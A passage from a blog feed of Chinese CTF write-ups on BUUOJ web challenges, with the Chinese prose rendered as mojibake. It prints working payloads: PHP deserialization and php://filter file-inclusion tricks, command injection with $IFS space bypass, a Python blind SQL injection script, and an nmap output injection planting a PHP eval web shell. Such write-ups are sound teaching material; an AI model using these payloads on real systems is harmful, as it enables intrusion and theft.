alt=""></p><p>åºåˆ—åŒ–åï¼š</p><pre><code>a:2:{s:7:&quot;&quot;;s:54:&quot;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}</code></pre><p>åé¢å°†å¤šä½™çš„imgæˆªæ‰ï¼Œå‰é¢â€;s:54:ä¸ºé”®ï¼Œxxxxxxxä¸ºå€¼ï¼Œç„¶åæˆåŠŸä¿®æ”¹imgçš„å€¼ä¸ºd0g3_f1ag.phpï¼Œä»è€ŒæˆåŠŸè¯»å–åˆ°phpæ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gizld9243jj30qo0bhdh2.jpg" alt=""><br>å‘ç°flagåœ¨ <code>/d0g3_fllllllag</code>ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gizlo98fzfj30sn0by0ty.jpg" alt=""><br>æ¥ç€æ„é€ payload:</p><pre><code>_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></pre><p>å³å¯è·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12261610.html</a></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>ä»é¡µé¢åé¢çš„ <code>?category=woofers</code>å¯ä»¥çŒœæµ‹æœ¬é¢˜ä¸ºæ–‡ä»¶åŒ…å«ï¼Œå°è¯•æ„é€ ä¼ªåè®®è¯»å–æºç :</p><pre><code>?category=php://filter/convert.base64-encode/resource=index.php</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizn84y3p9j30kl03f74h.jpg" alt=""><br>æ ¹æ®é”™è¯¯å¯çŸ¥åŒ…å«æ–‡ä»¶æ—¶åœ¨index.phpåé¢åˆåŠ äº†.phpï¼Œæ‰€ä»¥å‘ç”Ÿäº†é”™è¯¯ã€‚æ”¹ä¸ºresource=indexå³å¯è¯»å‡ºæºç ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gizna7gs3aj30sn091755.jpg" alt=""></p><pre><code>&lt;?php            $file = $_GET[&apos;category&apos;];            if(isset($file))            {                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){                    include ($file . &apos;.php&apos;);                }                else{                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                }            }            ?&gt;</code></pre><p>ä»ä»£ç é‡Œå¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–index.phpï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è¯»å–flag.phpã€‚</p><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giznl1bcdlj30bf02tweb.jpg" alt=""></p><p>ä½¿ç”¨ <code>?category=woofers/../flag</code>å‘ç°flag.phpç¡®å®è¢«åŒ…å«äº†ã€‚<br>php://filterä¼ªåè®®æ˜¯å¯ä»¥å¥—ä¸€å±‚åè®®çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¯»å–flagã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giznoqyr04j31d10fqaby.jpg" alt=""><br>æ„é€ payload:</p><pre><code>?category=php://filter/convert.base64-encode/resource/index/resource=flag</code></pre><p>æˆåŠŸè·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/mochu7777777/article/details/105204141" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/105204141</a></p><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gizox6oeabj318h02o74f.jpg" alt=""><br>ä¸€è¿›å»ï¼Œé¢˜ç›®å°±æåˆ°äº†æ–‡ä»¶å¤´ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gizoycq775j30cp02v3yh.jpg" alt=""><br>æ‰«æå‘ç°æœ‰robots.txtæ–‡ä»¶ã€‚</p><pre><code>User-agent: *Disallow: /fAke_f1agggg.php</code></pre><p>robots.txtç»™å‡ºæç¤ºã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gizp0ve3xaj30q6072gmc.jpg" alt=""><br>æŠ“åŒ…ï¼Œåœ¨å“åº”å¤´ä¸Šå‘ç°æç¤º <code>/fl4g.php</code>ã€‚<br>æ‰“å¼€æ˜¯ä¹±ç ï¼Œä½¿ç”¨charsetä¿®æ”¹ç¼–ç ä¸ºunicodeå³æ˜¾ç¤ºæ­£å¸¸ã€‚</p><pre><code>&lt;?phpheader(&apos;Content-type:text/html;charset=utf-8&apos;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&apos;num&apos;])){$num = $_GET[&apos;num&apos;];if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;}else{die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);}}else{die(&quot;å»éæ´²å§&quot;);}//level 2if (isset($_GET[&apos;md5&apos;])){   $md5=$_GET[&apos;md5&apos;];   if ($md5==md5($md5))   echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;   else   die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);}else{die(&quot;å»éæ´²å§&quot;);}//get flagif (isset($_GET[&apos;get_flag&apos;])){$get_flag = $_GET[&apos;get_flag&apos;];if(!strstr($get_flag,&quot; &quot;)){$get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;system($get_flag);}else{die(&quot;å¿«åˆ°éæ´²äº†&quot;);}}else{die(&quot;å»éæ´²å§&quot;);}?&gt;</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizps5raqkj30tz0ikdhb.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gizqpzaydaj30tw0ka76k.jpg" alt=""><br>è¾“å…¥1e10æ—¶inteval(â€˜1e10â€™)ä¸º1ï¼Œinteval(â€˜1e10â€™+1)=1410065409æˆåŠŸç»•è¿‡ã€‚</p><p>ç¬¬äºŒå…³éœ€è¦è¾“å…¥çš„ä¸º0eå¼€å¤´å¹¶ä¸”md5åŠ å¯†åä¹Ÿæ˜¯0eå¼€å¤´çš„md5å€¼ï¼Œæ‰¾äº†ä¸€ä¸‹ï¼Œ0e215962017ç¬¦åˆæ¡ä»¶ã€‚</p><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gizr682wdmj31cf0kntb1.jpg" alt=""><br>ç”¨lså‘½åçœ‹ä¸€ä¸‹flagæ–‡ä»¶çš„åå­—ï¼Œç¬¬ä¸‰å…³è¿‡æ»¤äº†catï¼Œå¯ä»¥ç”¨tacï¼Œheadï¼Œmoreç»•è¿‡ã€‚è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨${IFS}$ç»•è¿‡ï¼Œä½†æ˜¯${IFS}$ä¸è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨$IFS$1ç»•è¿‡ã€‚<br>payload:</p><pre><code>?num=1e10&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizrxx9e5cj31cd0kdaiy.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gizrypmmvhj318h0iv46z.jpg" alt=""><br>ç»æµ‹è¯•å‘ç°æ³¨å…¥ç‚¹æ˜¯åœ¨search.phpä¸­idçš„å‚æ•°ä¸Šã€‚ä½¿ç”¨å¼‚æˆ–å‘ç°é¢˜ç›®æ˜¾ç¤ºæœ‰åŒºåˆ«ï¼Œè€Œä¸”é¢˜ç›®æç¤ºäº†SQLç›²æ³¨ã€‚</p><p>ç›²æ³¨è„šæœ¬ï¼š</p><pre><code>#ç„¶åæ˜¯äºŒåˆ†æ³•ï¼ŒäºŒåˆ†æ³•è¦å¿«å¾ˆå¤šï¼š# -*- coding: UTF-8 -*-import reimport requestsimport stringurl = &quot;http://a7512037-44d3-449c-ae7f-54e751d21b0d.node3.buuoj.cn/search.php&quot;flag = &apos;&apos;def payload(i,j):# sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)#æ•°æ®åº“åå­—  # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&apos;geek&apos;),%d,1))&gt;%d)^1&quot;%(i,j)   #è¡¨å# sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;F1naI1y&apos;)),%d,1))&gt;%d)^1&quot;%(i,j)#åˆ—åsql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)data = {&quot;id&quot;:sql}r = requests.get(url,params=data)# print (r.url)if &quot;Click&quot; in r.text:res = 1else:res = 0return resdef exp():global flagfor i in range(1,10000) :print(i,&apos;:&apos;)low = 31high = 127while low &lt;= high :mid = (low + high) // 2res = payload(i,mid)if res :low = mid + 1else :high = mid - 1f = int((low + high + 1)) // 2if (f == 127 or f == 31):break# print (f)flag += chr(f)print(flag)exp()print(&apos;flag=&apos;,flag)</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizsdimi7xj31go073jsn.jpg" alt=""><br>ç»è¿‡ä¸€æ®µæ—¶é—´ï¼Œå°±è·‘å‡ºäº†flagã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gizsn01vgrj30f50ah0st.jpg" alt=""><br>æŸ¥çœ‹æºç å‘ç°æœ‰ä¸€æ®µä»£ç ï¼Œä½†æ˜¯æ˜¯å‰ç«¯éªŒè¯ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œè€Œä¸”md5ä¹Ÿè§£ä¸å‡ºæ¥ï¼Œä½†æ˜¯å‘ç°æœ‰flag.phpï¼Œè®¿é—®ä¸€ä¸‹ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gizss1xe9hj30qr0lkdkm.jpg" alt=""><br>é¢˜ç›®è¯´ä¿å­˜äº†è´­ä¹°è€…çš„IPï¼Œè€Œä¸”è¯´é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡äººèƒ½çœ‹åˆ°flagã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gizsu013zcj30wt0caq4a.jpg" alt=""><br>ä¿®æ”¹ipåè·å¾—flagã€‚</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>å’Œ[BUUCTF 2018]Online Toolç±»ä¼¼ï¼Œå°±æ˜¯æ„é€  <code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br>scanåæ˜¾ç¤ºhackerï¼Œè¯´æ˜è¢«æ£€æµ‹å‡ºæ¥äº†ã€‚ç»æ£€æŸ¥å‘ç°æ˜¯è¿‡æ»¤äº†phpã€‚<br>æ‰€ä»¥é‡æ–°æ„é€ ä¸€ä¸‹payload:</p><pre><code>&apos; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &apos;</code></pre><p>ä½¿ç”¨phtmlç»•è¿‡htmlæ£€æµ‹ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giztg15oemj31h207tjsa.jpg" alt=""><br>ä¸Šä¼ æˆåŠŸåå°±èƒ½è®¿é—®è¯¥æ–‡ä»¶äº†ã€‚ç”¨èšå‰‘è¿æ¥ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giztgv77fgj30n808et98.jpg" alt=""><br>åœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagã€‚</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUOJ&quot;&gt;&lt;a href=&quot;#BUUOJ&quot; class=&quot;headerlink&quot; title=&quot;BUUOJ&quot;&gt;&lt;/a&gt;&lt;em&gt;BUUOJ&lt;/em&gt;&lt;/h1&gt;&lt;h2 id=&quot;HCTF-2018-WarmUp&quot;&gt;&lt;a href=&quot;#HCTF-2018-WarmUp
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="buuoj" scheme="https://devildragons.github.io/tags/buuoj/"/>
    
  </entry>
  
</feed>
